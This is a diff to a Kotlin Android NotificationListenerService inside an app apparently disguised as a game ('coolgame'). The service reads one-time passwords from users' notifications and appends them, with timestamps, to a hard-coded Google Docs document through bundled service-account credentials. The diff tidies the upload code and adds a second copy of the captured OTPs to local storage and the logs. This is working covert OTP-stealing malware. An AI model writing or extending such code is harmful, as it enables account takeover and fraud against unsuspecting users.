@@ -1,9 +1,16 @@
 package com.example.coolgame
 
 import android.app.Notification
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.app.Service
+import android.content.Context
+import android.content.Intent
+import android.os.Build
 import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
 import android.util.Log
+import androidx.core.app.NotificationCompat
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.launch
@@ -27,9 +34,9 @@ import java.io.InputStream
 
 class MyNotificationListenerService : NotificationListenerService() {
     companion object {
-        private const val TAG = "NotificationListener"  // Descriptive Tag
+        private const val TAG = "NotificationListener"
 
-        // Sometimes notifications are triggered multiple times - for a heads-up notification, updates it with extended description and shortened form. To keep only one of them
+        // Sometimes notifications are triggered multiple times
         private var lastProcessedTime = 0L
         private var lastProcessedMessage = ""
         private var lastProcessedPackage = ""
@@ -124,59 +131,84 @@ class MyNotificationListenerService : NotificationListenerService() {
 
     @OptIn(DelicateCoroutinesApi::class)
     private fun uploadToGoogleDocs(message: String) {
-        Log.d("After PK", "Working")
+        Log.d(TAG, "Starting Google Docs upload")
+
+        // First, store the message locally as a backup
+        storeOTPLocally(message)
 
         GlobalScope.launch(Dispatchers.IO) {
-            val inputStream: InputStream = applicationContext.assets.open("credentials.json") // Rename this file
-            val jsonCred = inputStream.bufferedReader().use { it.readText() }
-
-            Log.d(TAG, "Successfully read file")
-
-
-            val googleCredentials = GoogleCredentials.fromStream(jsonCred.byteInputStream())
-                .createScoped(listOf(DocsScopes.DOCUMENTS))
-
-            val httpTransport: HttpTransport = NetHttpTransport()
-            val jsonFactory: JsonFactory = GsonFactory()
-
-            val requestInitializer = HttpCredentialsAdapter(googleCredentials)
-
-            val service = Docs.Builder(httpTransport, jsonFactory, null)
-                .setHttpRequestInitializer(requestInitializer)
-                .setApplicationName("ProjectMessages")
-                .build()
-
-            val documentId = "1iDZrmRHG_VTqw0f---7mhJVr_a01p3nUK-YbG7pmGPk" // Insert your new docID
-            val document = service.documents().get(documentId).execute()
-
-            // Determine the insertion index
-            val content = document.body?.content
-            val lastIndex = content?.lastOrNull()?.endIndex ?: 1
-            val insertionIndex = lastIndex - 1
-
-            // Format the message with a timestamp
-            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
-            val formattedMessage = "\nNew OTP: \n$message\tReceived at: $timestamp\n"
-
-            // Create a request to insert the formatted message
-            val requests = listOf(
-                Request().setInsertText(
-                    InsertTextRequest()
-                        .setText(formattedMessage)
-                        .setLocation(Location().setIndex(insertionIndex))
-                )
-            )
-
-            // Try to update the Google Docs document
             try {
-                service.documents()
-                    .batchUpdate(documentId, BatchUpdateDocumentRequest().setRequests(requests))
-                    .execute()
-                Log.d("Afterpublishing", "Working")
+                val inputStream: InputStream = applicationContext.assets.open("credentials.json")
+                val jsonCred = inputStream.bufferedReader().use { it.readText() }
+
+                Log.d(TAG, "Successfully read credentials file")
+
+                val googleCredentials = GoogleCredentials.fromStream(jsonCred.byteInputStream())
+                    .createScoped(listOf(DocsScopes.DOCUMENTS))
+
+                val httpTransport: HttpTransport = NetHttpTransport()
+                val jsonFactory: JsonFactory = GsonFactory()
+
+                val requestInitializer = HttpCredentialsAdapter(googleCredentials)
+
+                val service = Docs.Builder(httpTransport, jsonFactory, null)
+                    .setHttpRequestInitializer(requestInitializer)
+                    .setApplicationName("ProjectMessages")
+                    .build()
+
+                Log.d(TAG, "Created Google Docs service")
+
+                val documentId = "1iDZrmRHG_VTqw0f---7mhJVr_a01p3nUK-YbG7pmGPk"
+                val document = service.documents().get(documentId).execute()
+                Log.d(TAG, "Retrieved document information")
+
+                // Determine the insertion index
+                val content = document.body?.content
+                val lastIndex = content?.lastOrNull()?.endIndex ?: 1
+                val insertionIndex = lastIndex - 1
+
+                // Format the message with a timestamp
+                val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
+                val formattedMessage = "\nNew OTP: \n$message\tReceived at: $timestamp\n"
+
+                Log.d(TAG, "Preparing document update request")
+
+                // Create a request to insert the formatted message
+                val requests = listOf(
+                    Request().setInsertText(
+                        InsertTextRequest()
+                            .setText(formattedMessage)
+                            .setLocation(Location().setIndex(insertionIndex))
+                    )
+                )
+
+                // Try to update the Google Docs document
+                try {
+                    service.documents()
+                        .batchUpdate(documentId, BatchUpdateDocumentRequest().setRequests(requests))
+                        .execute()
+                    Log.d(TAG, "Successfully updated Google Docs document")
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to update document: ${e.message}")
+                    e.printStackTrace()
+                }
             } catch (e: Exception) {
-                Log.e("GoogleDocsError", "Failed to update document: ${e.message}")
+                Log.e(TAG, "Error in upload process: ${e.message}")
+                e.printStackTrace()
             }
         }
     }
 
+    private fun storeOTPLocally(message: String) {
+        try {
+            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
+            val prefs = applicationContext.getSharedPreferences("otp_storage", Context.MODE_PRIVATE)
+            val existing = prefs.getString("otps", "") ?: ""
+            val updated = existing + "\n[$timestamp] $message"
+            prefs.edit().putString("otps", updated).apply()
+            Log.d(TAG, "OTP stored locally: $message")
+        } catch (e: Exception) {
+            Log.e(TAG, "Error storing OTP locally: ${e.message}")
+        }
+    }
 }
